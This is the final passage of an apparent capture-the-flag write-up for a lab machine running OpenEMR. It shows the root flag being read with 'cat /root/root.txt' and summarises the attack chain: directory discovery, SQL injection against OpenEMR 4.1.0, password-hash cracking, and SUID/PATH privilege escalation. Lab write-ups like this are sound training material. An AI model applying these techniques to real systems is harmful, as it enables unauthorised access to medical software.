       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```shell
[root@localhost openemr]# cat /root/root.txt
██    ██  ██████  ██    ██     ████████ ██████  ██ ███████ ██████      ██   ██  █████  ██████  ██████  ███████ ██████  ██ 
 ██  ██  ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ ██ 
  ████   ██    ██ ██    ██        ██    ██████  ██ █████   ██   ██     ███████ ███████ ██████  ██   ██ █████   ██████  ██ 
   ██    ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██    
   ██     ██████   ██████         ██    ██   ██ ██ ███████ ██████      ██   ██ ██   ██ ██   ██ ██████  ███████ ██   ██ ██ 
                                                                                                                          
                                                                                                                          
Thanks for Playing!

Follow me at: http://v1n1v131r4.com


root hash: {Redacted}
```

## Conclusion

What we've learned:

1. Content discovery via `gobuster`
2. Exploiting OpenEMR 4.1.0 SQL injection with error-based SQL injection
3. Cracking password hashes
4. Vertical privilege escalation via SUID binary and `PATH` environment variable injection